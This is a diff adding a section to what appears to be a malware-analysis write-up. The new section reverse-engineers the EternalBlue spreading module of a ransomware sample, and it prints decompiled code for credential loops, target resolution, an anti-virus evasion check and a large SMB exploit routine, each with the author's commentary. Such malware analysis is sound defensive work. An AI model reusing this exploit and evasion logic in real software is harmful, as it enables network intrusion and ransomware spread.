@@ -9662,6 +9662,653 @@ This finishes the first thread started inside the loop.
 > ==========================
 > (because we are running out of time and EternalBlue is huge we at least want to see disk encryption in our ransomware...)
 
+### FUN_1000a274 (EternalBlue)
+
+```cpp
+undefined4 FUN_1000a274(DWORD *param_1){
+  LPCRITICAL_SECTION p_Var1;
+  LPVOID extraout_EAX;
+  int iVar2;
+  uint uVar3;
+  HANDLE hHeap;
+  undefined4 unaff_EDI;
+  DWORD dwFlags;
+  WCHAR local_24 [16];
+  
+  Sleep(*param_1);
+  p_Var1 = critical_section_no_extra_debug;
+  read_crit_sect(local_24,critical_section_no_extra_debug);
+  if (extraout_EAX != (LPVOID)0x0) {
+    do {
+      iVar2 = FUN_10009dc3(local_24);
+      if (iVar2 != 0) {
+        meth_10006f91((cls_10006f91 *)local_24,(char)p_Var1,extraout_EAX,unaff_EDI);
+      }
+      local_24[0] = L'\0';
+      uVar3 = get_cred_data(local_24,extraout_EAX,p_Var1);
+    } while (uVar3 != 0);
+    free_memory(extraout_EAX);
+  }
+  dwFlags = 0;
+  hHeap = GetProcessHeap();
+  HeapFree(hHeap,dwFlags,param_1);
+  return 0;
+}
+```
+
+Here we again see a kidna similar loop that initialises credentials data and then calls a function with that data. We will rename this function to `eternal_credentials_loop`.
+
+### FUN_10009dc3 (EternalBlue)
+
+```cpp
+undefined4 FUN_10009dc3(LPCWSTR param_1){
+  uint uVar1;
+  undefined4 uVar2;
+  WCHAR local_4004 [8190];
+  undefined4 uStack8;
+  
+  uStack8 = 0x10009dd0;
+  local_4004[0] = L'\0';
+  uVar2 = 0;
+  uVar1 = fetch_cmd_arguments(local_4004);
+  if (uVar1 != 0) {
+    uVar2 = FUN_100096c7(param_1,local_4004,uVar1);
+  }
+  return uVar2;
+}
+```
+
+Looks like this function just fetches the cmd arguments and then calls `FUN_100096c7` we will rename this function to `eternal_cmd_args`.
+
+### FUN_100096c7 (EternalBlue)
+
+```cpp
+undefined4 FUN_100096c7(LPCWSTR param_1,undefined4 param_2,undefined4 param_3){
+  WCHAR WVar1;
+  undefined4 uVar2;
+  undefined4 uVar3;
+  LPWSTR pWVar4;
+  ulong uVar5;
+  uint uVar6;
+  WCHAR *pWVar7;
+  int iVar8;
+  WCHAR local_314;
+  undefined local_312 [518];
+  CHAR local_10c [260];
+  undefined4 local_8;
+  
+  uVar3 = malware_dll_buffer_size_bytes;
+  uVar2 = malware_dll_buffer;
+  local_8 = 0;
+  if (((detected_anti_virus & 4) != 0) &&
+     (pWVar4 = PathFindFileNameW(&dll_fully_qualified_path), pWVar4 != (LPWSTR)0x0)) {
+    iVar8 = -0x314 - (int)pWVar4;
+    do {
+      WVar1 = *pWVar4;
+      *(WCHAR *)((int)register0x00000010 + iVar8 + (int)pWVar4) = WVar1;
+      pWVar4 = pWVar4 + 1;
+    } while (WVar1 != L'\0');
+    WideCharToMultiByte(0xfde9,0,param_1,-1,local_10c,0x104,(LPCSTR)0x0,(LPBOOL)0x0);
+    uVar5 = inet_addr(local_10c);
+    if ((uVar5 == 0xffffffff) && (uVar6 = FUN_10009683(local_10c), uVar6 == 0)) {
+      return local_8;
+    }
+    pWVar7 = &local_314;
+    do {
+      WVar1 = *pWVar7;
+      pWVar7 = pWVar7 + 1;
+    } while (WVar1 != L'\0');
+    iVar8 = FUN_1000668a(local_10c,uVar2,uVar3,param_2,param_3,&local_314,
+                         (int)((int)pWVar7 - (int)local_312) >> 1);
+    if (iVar8 == 0) {
+      local_8 = 1;
+    }
+  }
+  return local_8;
+}
+```
+
+This function looks a fair bit more complicated. What is also interesting is that a check is made for anti_virus `4` which means that the function just returns immediately if `Kaspersky` is running.
+
+Other than that this function just appears to just convert the passed `param_1` argument which was most likely an IP to a real `inet_addr` format before making a check using `FUN_100096831`.
+
+### FUN_100096831 (EternalBlue)
+
+```cpp
+uint FUN_10009683(LPSTR param_1){
+  byte *pbVar1;
+  int iVar2;
+  
+  iVar2 = Ordinal_52(param_1);
+  if (iVar2 != 0) {
+    pbVar1 = **(byte ***)(iVar2 + 0xc);
+    wsprintfA(param_1,"%u.%u.%u.%u",(uint)*pbVar1,(uint)pbVar1[1],(uint)pbVar1[2],(uint)pbVar1[3]);
+  }
+  return (uint)(iVar2 != 0);
+}
+```
+
+Turns out `Ordinal_52` is [gethostbyname](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostbyname) from `ws2_32.dll` and it gets host information for the passed host. In this case the host name is nicely formatted into `param_1`. We will rename this function to `eternal_get_and_format_hostname`.
+
+### Back to FUN_100096c7 (EternalBlue)
+
+Back we see that `FUN_1000668a` is called with most of the host data prepared in this function. We will rename this function to `eternal_get_host_information`.
+
+### FUN_1000668a (EternalBlue)
+
+```cpp
+int FUN_1000668a(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7){
+  DWORD DVar1;
+  int iVar2;
+  undefined4 local_58 [21];
+  
+  memset(local_58,0,0x54);
+  DVar1 = GetTickCount();
+  DAT_1001f8fd = 0;
+  _DAT_1001fb48 = (short)DVar1;
+  iVar2 = FUN_10005a7e(local_58,param_1,0x1bd,(undefined *)0x0,param_2,param_3,param_4,param_5,param_6,param_7);
+  if (iVar2 == 0) {
+    DAT_1001f8fd = 0;
+    iVar2 = FUN_10005a7e(local_58,param_1,0x1bd,FUN_10001f74,param_2,param_3,param_4,param_5,param_6,param_7);
+    FUN_10002068();
+  }
+  else {
+    FUN_10002068();
+  }
+  return iVar2;
+}
+```
+
+This function appears to call several functions with the data gathered so far. Given that we peek ahead and see that `FUN_10005a7e` is massive we first focus on the other two functions.
+
+### FUN_10002068 (EternalBlue)
+
+```cpp
+void FUN_10002068(void){
+  SOCKET *in_EAX;
+  int iVar1;
+  
+  iVar1 = 0x15;
+  do {
+    if (*in_EAX != 0) {
+      closesocket(*in_EAX);
+    }
+    *in_EAX = 0xffffffff;
+    in_EAX = in_EAX + 1;
+    iVar1 = iVar1 + -1;
+  } while (iVar1 != 0);
+  return;
+}
+```
+
+Looks like this function is just socket cleanup and the socket is passed via `EAX` we will rename the function to `eternal_close_socket`. Since we see that it is called from one other function we also setup custom storage for the socket parameter.
+
+### FUN_10001f74
+
+```cpp
+uint FUN_10001f74(void *param_1,size_t param_2,void *param_3,size_t param_4,void *param_5,size_t param_6,LPVOID *param_7,void **param_8,void *param_9,uint param_10,void *param_11,uint param_12){
+  HANDLE hHeap;
+  LPVOID _Dst;
+  void *dwBytes;
+  void *_Dst_00;
+  DWORD dwFlags;
+  
+  dwBytes = (void *)(param_4 + 0x76fc2 + param_6);
+  *param_8 = dwBytes;
+  if (0x1fff < param_10) {
+    param_10 = 0x1fff;
+  }
+  if (0x80 < param_12) {
+    param_12 = 0x7f;
+  }
+  if ((void *)(param_2 + param_4 + 0x481c + param_6) <= dwBytes) {
+    dwFlags = 8;
+    hHeap = GetProcessHeap();
+    _Dst = HeapAlloc(hHeap,dwFlags,(SIZE_T)dwBytes);
+    *param_7 = _Dst;
+    dwBytes = memcpy(_Dst,param_3,param_4);
+    if (dwBytes != (void *)0x0) {
+      _Dst_00 = (void *)((int)_Dst + param_4);
+      dwBytes = memcpy(_Dst_00,param_11,param_12 * 2);
+      if ((dwBytes != (void *)0x0) &&
+         (dwBytes = memcpy((void *)((int)_Dst_00 + 0x100),param_9,param_10 * 2),
+         dwBytes != (void *)0x0)) {
+        *(size_t *)((int)_Dst_00 + 0x4818) = param_2;
+        dwBytes = memcpy((void *)((int)_Dst_00 + 0x481c),param_1,param_2);
+        if ((dwBytes != (void *)0x0) &&
+           (dwBytes = memcpy((void *)((int)*param_7 + param_4 + 0x76fc2),param_5,param_6),
+           dwBytes != (void *)0x0)) {
+          return CONCAT31((int3)((uint)dwBytes >> 8),1);
+        }
+      }
+    }
+  }
+  return (uint)dwBytes & 0xffffff00;
+}
+```
+
+This function is pass as an argument on the second call to the large function is the calling function. The function is rather hard to grasph though, the best name for it seems `eternal_prepare_data` as it seems to mainly join all the passed parameters into a single value.
+
+Next we move on to the large function.
+
+### FUN_10005a7e (EternalBlue)
+
+```cpp
+undefined4 FUN_10005a7e(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined *param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9,undefined4 param_10){
+  SIZE_T SVar1;
+  LPVOID pvVar2;
+  size_t _Size;
+  byte bVar3;
+  uint uVar4;
+  int iVar5;
+  int iVar6;
+  size_t *psVar7;
+  undefined4 uVar8;
+  undefined *puVar9;
+  undefined4 *puVar10;
+  undefined *puVar11;
+  uint uVar12;
+  bool bVar13;
+  undefined4 uVar14;
+  uint uVar15;
+  undefined4 *puVar16;
+  undefined4 uVar17;
+  undefined4 local_3c;
+  uint local_38;
+  uint local_34;
+  undefined4 *local_30;
+  uint local_2c;
+  void *local_28;
+  LPVOID local_24;
+  SIZE_T local_20;
+  size_t local_1c;
+  LPVOID local_18;
+  SIZE_T local_14;
+  byte *local_10;
+  undefined4 *local_c;
+  
+  do {
+    iVar6 = FUN_10006727((int *)&param_1,param_2,param_3);
+    if (iVar6 != 0) {
+      return 0xffffffff;
+    }
+    uVar4 = FUN_100020b2();
+    local_30 = (undefined4 *)0xfeff;
+    local_34 = 0;
+    local_3c = 0;
+    local_2c = uVar4 & 0xffff;
+    local_38 = FUN_100020b2();
+    puVar10 = param_1;
+    local_38 = local_38 & 0xffff;
+    local_20 = 0;
+    local_28 = (void *)0x0;
+    local_1c = 0;
+    local_18 = (LPVOID)0x0;
+    iVar6 = FUN_10002ef5(0xc007,uVar4 & 0xffff,0xfeff,local_38);
+    if (iVar6 != 0) {
+      return 0xffffffff;
+    }
+    iVar6 = FUN_10002f88(0xc007,local_2c,0xfeff,&local_3c,local_38,0xd,0,0,&local_28,&local_1c);
+    if (iVar6 != 0) {
+      return 0xffffffff;
+    }
+    if (local_28 == (void *)0x0) {
+LAB_10006357:
+      uVar4 = 0;
+LAB_10006361:
+      FUN_100031fb(*puVar10,local_2c,uVar4,0xfeff,local_3c,local_38);
+      eternal_close_socket(puVar10);
+      return 0xffffffff;
+    }
+    bVar3 = FUN_100022a2(local_1c);
+    local_24 = (LPVOID)((uint)local_24 & 0xffffff00 | (uint)bVar3);
+    FUN_100020d0();
+    if ((char)local_24 == -1) goto LAB_10006357;
+    iVar6 = FUN_10003061(local_2c,&local_34,0xfeff,local_3c,local_38);
+    uVar4 = local_34;
+    if (iVar6 != 0) goto LAB_10006361;
+    local_c = (undefined4 *)allocate_memory(0xc);
+    if (local_c == (undefined4 *)0x0) {
+      return 0xffffffff;
+    }
+    local_14 = FUN_1000330e(*puVar10,(short)local_2c,(short)local_34,0xfeff,(short)local_3c,
+                            (short)local_38 + 1,0xf0,local_c,(void *)0x0,0,(int *)&local_18,
+                            &local_28,(undefined2 *)&local_1c);
+    FUN_100020d0();
+    if ((local_14 == 0xffffffff) || (local_28 == (void *)0x0)) goto LAB_10006618;
+    if (*(short *)((int)local_28 + 0x1a) == 0x11) {
+      iVar6 = *(int *)((int)local_28 + 0x16);
+      DAT_1001f8fc = -1;
+      if (iVar6 == 0) {
+        DAT_1001f8fc = (char)iVar6;
+      }
+      if (iVar6 == 1) {
+        DAT_1001f8fc = (char)iVar6;
+      }
+      if (param_4 == (undefined *)0x0) {
+        FUN_100020d0();
+        puVar16 = (undefined4 *)0xfeff;
+        uVar8 = *puVar10;
+        uVar14 = 0xd04b1e;
+        uVar12 = local_2c;
+        uVar15 = local_34;
+        uVar17 = local_3c;
+        uVar4 = local_38;
+        goto LAB_1000662d;
+      }
+      uVar4 = *(uint *)((int)local_28 + 0x12);
+      local_10 = (byte *)(((uVar4 & 0xff0000 | uVar4 >> 0x10) >> 8 |
+                          (uVar4 << 0x10 | uVar4 & 0xff00) << 8) ^ uVar4 * 2);
+      FUN_100020d0();
+      if (local_10 == (byte *)0x0) goto LAB_10006618;
+      local_1c = 0;
+      local_30 = (undefined4 *)0x0;
+      bVar13 = DAT_1001f8fc != '\x01';
+      if (bVar13) {
+        puVar9 = &DAT_10017090;
+        puVar11 = &DAT_10016020;
+      }
+      else {
+        puVar9 = &DAT_1001f900;
+        puVar11 = &DAT_10017860;
+      }
+      (*(code *)param_4)(param_5,param_6,puVar11,((uint)bVar13 - 1 & 0x200) + 0x1070,puVar9,
+                         ((uint)bVar13 - 1 & 0xfffffa00) + 0x7ce,&local_30,&local_1c,param_7,param_8
+                         ,param_9,param_10);
+      local_14 = 0;
+      local_18 = (LPVOID)0x0;
+      iVar6 = FUN_100020ea(&local_14,local_1c,(char)local_24);
+      _Size = local_14;
+      if (iVar6 != 0) goto LAB_10006618;
+      local_20 = local_14 + 8 + local_1c;
+      if ((local_20 & 3) != 0) {
+        local_20 = local_20 + (4 - (local_20 & 3));
+      }
+      local_24 = allocate_memory(local_20);
+      if ((local_24 == (LPVOID)0x0) || (local_30 == (undefined4 *)0x0)) goto LAB_10006613;
+      memcpy(local_24,local_18,_Size);
+      psVar7 = (size_t *)((int)local_24 + _Size);
+      *psVar7 = local_1c;
+      psVar7[1] = 1;
+      memcpy(psVar7 + 2,local_30,local_1c);
+      FUN_100020d0();
+      local_28 = (void *)0x0;
+      local_18 = (LPVOID)0x0;
+      uVar4 = local_20 >> 0xc;
+      local_c = (undefined4 *)(local_20 & 0xfff);
+      if ((uVar4 == 0) || (local_14 = 0, uVar4 == 0)) goto LAB_100065a5;
+      break;
+    }
+    FUN_100020d0();
+    iVar6 = FUN_100035fa(0x2801,local_2c,local_34,0xfeff,local_3c,local_38,2,0xff,0);
+    if (iVar6 != -0x3ffffdfb) goto LAB_10006618;
+    if (param_4 == (undefined *)0x0) goto LAB_100065f8;
+    if (2 < DAT_1001f8fd) goto LAB_10006618;
+    DAT_1001f8fd = DAT_1001f8fd + 1;
+    if ((((char)local_24 == '\x02') || ((char)local_24 == '\x03')) || ((char)local_24 == '\x04')) {
+      local_10 = (byte *)((uint)local_10 & 0xffffff00);
+      iVar6 = FUN_10003ec8(*puVar10,local_2c,local_34,0xfeff,local_3c,local_38,&local_20);
+      if (iVar6 != 0) goto LAB_10006618;
+      uVar4 = rand();
+      uVar15 = local_34;
+      local_30 = (undefined4 *)(uVar4 & 0xffff);
+      iVar6 = FUN_1000407b(*puVar10,local_2c,local_34,local_30,local_3c,local_20);
+      uVar17 = local_3c;
+      puVar16 = local_30;
+      if (((iVar6 != 0) ||
+          (iVar6 = FUN_100042df(*puVar10,local_2c,uVar15,local_30,local_3c,(short *)&local_38),
+          puVar16 = local_30, iVar6 != 0)) ||
+         ((iVar6 = FUN_1000489c(*puVar10,local_2c,uVar15,uVar17,local_20), puVar16 = local_30,
+          iVar6 != 0 ||
+          ((iVar6 = FUN_10004ba1(*puVar10,local_2c,uVar15,local_30,uVar17,local_20),
+           SVar1 = local_20, puVar16 = local_30, iVar6 != 0 ||
+           (iVar6 = FUN_100051f3(*puVar10,local_2c,uVar15,local_30,uVar17), puVar16 = local_30,
+           uVar17 = local_3c, iVar6 != 0)))))) goto LAB_10006625;
+      iVar6 = FUN_10005333(*puVar10,local_2c,uVar15,local_30,local_38,SVar1,local_10);
+      puVar10 = param_1;
+      if (iVar6 == 0) goto LAB_10005d53;
+LAB_10006657:
+      uVar8 = *param_1;
+      uVar12 = local_2c;
+      uVar15 = local_34;
+      puVar16 = local_30;
+      uVar17 = local_3c;
+      uVar4 = local_38;
+      goto LAB_1000662b;
+    }
+LAB_10005d53:
+    if ((((char)local_24 == '\x05') || ((char)local_24 == '\x06')) || ((char)local_24 == '\a')) {
+      uVar8 = *puVar10;
+      local_14 = 0;
+      local_20 = FUN_10002547(local_2c,local_34,local_30,local_3c,local_38);
+      uVar15 = local_34;
+      puVar16 = local_30;
+      uVar17 = local_3c;
+      if (local_20 == 0) goto LAB_10006625;
+      local_18 = allocate_memory(0x1000);
+      if (local_18 == (LPVOID)0x0) {
+        FUN_100020d0();
+        uVar15 = local_34;
+        puVar16 = local_30;
+        uVar17 = local_3c;
+      }
+      else {
+        local_c = (undefined4 *)0x0;
+        iVar6 = FUN_1000688f(local_20);
+        pvVar2 = local_18;
+        if ((iVar6 == 0) && (iVar6 = FUN_1000243f(uVar8,1), iVar6 == 0)) {
+          iVar6 = *(int *)((int)pvVar2 + 9);
+          FUN_100020d0();
+          FUN_100020d0();
+          puVar10 = param_1;
+          uVar15 = local_34;
+          puVar16 = local_30;
+          uVar17 = local_3c;
+          if ((iVar6 != 0) ||
+             (iVar6 = FUN_10003b5d(uVar8,local_2c,local_34,local_30,local_3c,local_38),
+             puVar10 = param_1, uVar15 = local_34, puVar16 = local_30, uVar17 = local_3c, iVar6 != 0
+             )) goto LAB_10006625;
+          Sleep(0x456);
+          iVar6 = FUN_10006727((int *)&param_1,param_2,param_3);
+          uVar12 = local_2c;
+          uVar4 = local_38;
+          puVar10 = param_1;
+          if (iVar6 != 0) goto LAB_10006657;
+          iVar6 = FUN_10002ef5(0xc053,local_2c,local_30,local_38);
+          if (iVar6 == 0) {
+            local_14 = 0;
+            iVar6 = FUN_10002f88(0xc007,uVar12,local_30,&local_14,uVar4,0xc,0x12d,0xfff0,&local_28,
+                                 &local_1c);
+            if ((((((((iVar6 == 0) &&
+                     (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                     iVar6 == 0)) &&
+                    ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                     iVar6 == 0 &&
+                     ((((iVar6 = FUN_10003ca0(puVar10[2]), uVar4 = local_38, iVar6 == 0 &&
+                        (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                        iVar6 == 0)) &&
+                       (iVar6 = FUN_10003ca0(puVar10[3]), uVar4 = local_38, iVar6 == 0)) &&
+                      ((iVar6 = FUN_10003ca0(puVar10[4]), uVar4 = local_38, iVar6 == 0 &&
+                       (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                       iVar6 == 0)))))))) &&
+                   (iVar6 = FUN_10003ca0(puVar10[5]), uVar4 = local_38, iVar6 == 0)) &&
+                  ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                   iVar6 == 0 &&
+                   (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                   iVar6 == 0)))) &&
+                 (((iVar6 = FUN_10003ca0(puVar10[6]), uVar4 = local_38, iVar6 == 0 &&
+                   (((iVar6 = FUN_10003ca0(puVar10[7]), uVar4 = local_38, iVar6 == 0 &&
+                     (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                     iVar6 == 0)) &&
+                    (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                    iVar6 == 0)))) &&
+                  (((iVar6 = FUN_10003ca0(puVar10[8]), uVar4 = local_38, iVar6 == 0 &&
+                    (iVar6 = FUN_10003ca0(puVar10[9]), uVar4 = local_38, iVar6 == 0)) &&
+                   (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                   iVar6 == 0)))))) &&
+                (((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                  iVar6 == 0 && (iVar6 = FUN_10003ca0(puVar10[10]), uVar4 = local_38, iVar6 == 0))
+                 && ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                     iVar6 == 0 &&
+                     (((iVar6 = FUN_10003ca0(puVar10[0xb]), uVar4 = local_38, iVar6 == 0 &&
+                       (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                       iVar6 == 0)) &&
+                      (iVar6 = FUN_10003ca0(puVar10[0xc]), uVar4 = local_38, iVar6 == 0)))))))) &&
+               (((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                 iVar6 == 0 && (iVar6 = FUN_10003ca0(puVar10[0xd]), uVar4 = local_38, iVar6 == 0))
+                && ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                    iVar6 == 0 && (iVar6 = FUN_10003ca0(puVar10[0xe]), uVar4 = local_38, iVar6 == 0)
+                    ))))) {
+              Sleep(0x456);
+              uVar4 = local_38;
+              iVar6 = FUN_10002ef5(0xc053,uVar12,local_30,local_38);
+              if ((iVar6 == 0) &&
+                 (iVar6 = FUN_10002f88(0x4007,uVar12,local_30,&local_14,uVar4,0xc,300,0x87f8,
+                                       &local_28,&local_1c), iVar6 == 0)) {
+                if (puVar10[1] != 0) {
+                  closesocket(puVar10[1]);
+                  puVar10[1] = 0;
+                }
+                iVar6 = FUN_10006727((int *)&param_1,param_2,param_3);
+                uVar4 = local_38;
+                if ((((((iVar6 == 0) &&
+                       (iVar6 = FUN_10003ca0(puVar10[0x10]), uVar4 = local_38, iVar6 == 0)) &&
+                      (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                      iVar6 == 0)) &&
+                     ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                      iVar6 == 0 &&
+                      (iVar6 = FUN_10003ca0(puVar10[0x11]), uVar4 = local_38, iVar6 == 0)))) &&
+                    ((iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                     iVar6 == 0 &&
+                     ((iVar6 = FUN_10003ca0(puVar10[0x12]), uVar4 = local_38, iVar6 == 0 &&
+                      (iVar6 = FUN_10006727((int *)&param_1,param_2,param_3), uVar4 = local_38,
+                      iVar6 == 0)))))) &&
+                   ((iVar6 = FUN_10003ca0(puVar10[0x13]), uVar4 = local_38, iVar6 == 0 &&
+                    (iVar6 = FUN_10003ca0(puVar10[0x14]), uVar4 = local_38, iVar6 == 0)))) {
+                  if (puVar10[0xf] != 0) {
+                    closesocket(puVar10[0xf]);
+                    puVar10[0xf] = 0;
+                  }
+                  uVar4 = local_38;
+                  iVar6 = FUN_1000369d(uVar12,local_34,local_30,local_3c,local_38);
+                  uVar8 = *puVar10;
+                  uVar15 = local_34;
+                  puVar16 = local_30;
+                  uVar17 = local_3c;
+                  if (iVar6 != 0) goto LAB_1000662b;
+                  iVar6 = FUN_10003c0a(uVar8,uVar12,local_34,local_30,local_3c,uVar4);
+                  if (iVar6 == 0) {
+                    local_1c = 2;
+                    do {
+                      if ((local_1c != 0xf) && (iVar6 = FUN_10003ca0(puVar10[local_1c]), iVar6 != 0)
+                         ) goto LAB_10006673;
+                      local_1c = local_1c + 1;
+                    } while ((int)local_1c < 0x14);
+                    iVar6 = 2;
+                    do {
+                      if ((iVar6 != 0xf) &&
+                         (iVar5 = FUN_10003ca0(puVar10[iVar6]), uVar4 = local_38, iVar5 != 0))
+                      goto LAB_10006673;
+                      iVar6 = iVar6 + 1;
+                      puVar10 = param_1;
+                      uVar12 = local_2c;
+                    } while (iVar6 < 0x14);
+                    goto LAB_100062cd;
+                  }
+                }
+              }
+            }
+          }
+LAB_10006673:
+          uVar8 = *puVar10;
+          uVar15 = local_34;
+          puVar16 = local_30;
+          uVar17 = local_3c;
+          goto LAB_1000662b;
+        }
+        FUN_100020d0();
+        FUN_100020d0();
+        puVar10 = param_1;
+        uVar15 = local_34;
+        puVar16 = local_30;
+        uVar17 = local_3c;
+      }
+      goto LAB_10006625;
+    }
+LAB_100062cd:
+    FUN_10005a46(0,*puVar10,local_2c,local_34,local_30,local_3c,local_38);
+    eternal_close_socket(puVar10);
+    Sleep(0x456);
+  } while( true );
+  while( true ) {
+    local_28 = (void *)((int)local_28 + 0x1000);
+    local_14 = local_14 + 1;
+    if (uVar4 <= local_14) break;
+    iVar6 = FUN_10003dd7(*puVar10,(short)local_2c,(short)local_34,0xfeff,(short)local_3c,
+                         (short)local_38 + 1,local_10,0x1000,local_24,local_20,(int)local_28,
+                         (int *)&local_18);
+    if (iVar6 != 0) goto LAB_10006613;
+  }
+LAB_100065a5:
+  Sleep(0x456);
+  if (((ushort)local_c == 0) ||
+     (iVar6 = FUN_10003dd7(*puVar10,(short)local_2c,(short)local_34,0xfeff,(short)local_3c,
+                           (short)local_38 + 1,local_10,(ushort)local_c,local_24,local_20,
+                           (int)local_28,(int *)&local_18), iVar6 == 0)) {
+    FUN_100020d0();
+LAB_100065f8:
+    puVar16 = (undefined4 *)0xfeff;
+    uVar8 = *puVar10;
+    uVar14 = 0;
+    uVar12 = local_2c;
+    uVar15 = local_34;
+    uVar17 = local_3c;
+    uVar4 = local_38;
+  }
+  else {
+LAB_10006613:
+    FUN_100020d0();
+LAB_10006618:
+    uVar15 = local_34;
+    puVar16 = (undefined4 *)0xfeff;
+    uVar17 = local_3c;
+LAB_10006625:
+    uVar8 = *puVar10;
+    uVar12 = local_2c;
+    uVar4 = local_38;
+LAB_1000662b:
+    uVar14 = 0xffffffff;
+  }
+LAB_1000662d:
+  uVar8 = FUN_10005a46(uVar14,uVar8,uVar12,uVar15,puVar16,uVar17,uVar4);
+  return uVar8;
+}
+```
+
+Given the absurd number of out going references this is most likely the root function of EternalBlue and even worse is the fact that almost all the data is of an undefined type. We will rename the function to `eternal_blue_main`.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ### Back to Ordinal_1
 
 Next we see the following statement.
